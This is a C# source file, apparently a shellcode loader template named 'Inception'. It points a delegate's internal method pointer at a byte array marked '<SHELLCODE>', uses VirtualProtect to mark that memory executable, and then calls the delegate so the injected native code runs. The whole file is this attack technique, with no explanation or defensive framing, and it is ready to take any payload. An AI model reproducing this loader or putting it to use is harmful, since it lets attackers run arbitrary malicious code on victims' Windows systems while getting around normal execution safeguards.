using System;
using System.Reflection;
using System.Runtime.InteropServices;
namespace Inception
{
        class Program
        {
                [DllImport("kernel32.dll", SetLastError = true)]
                static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
                public delegate uint Ret1ArgDelegate(uint address);
                static uint PlaceHolder1(uint arg1) { return 0; }
                public static byte[] asmBytes = new byte[]
                {
                        <SHELLCODE>
                };
                public unsafe static void Run()
                {
                        fixed (byte* startAddress = &asmBytes[0]) // Take the address of our x86 code
                        {
                                // Get the FieldInfo for "_methodPtr"
                                Type delType = typeof(Delegate);
                                FieldInfo _methodPtr = delType.GetField("_methodPtr", BindingFlags.NonPublic |
                                BindingFlags.Instance);
                                // Set our delegate to our x86 code
                                Ret1ArgDelegate del = new Ret1ArgDelegate(PlaceHolder1);
                                _methodPtr.SetValue(del, (IntPtr) startAddress);
                                //Disable protection
                                uint outOldProtection;
                                VirtualProtect((IntPtr) startAddress, (uint) asmBytes.Length, 0x40, out outOldProtection);
                                // Enjoy
                                uint n = (uint)0x00000001;
                                n = del(n);
                                Console.WriteLine("{0:x}", n);
                                Console.ReadKey();
                        }
                }
        }
}
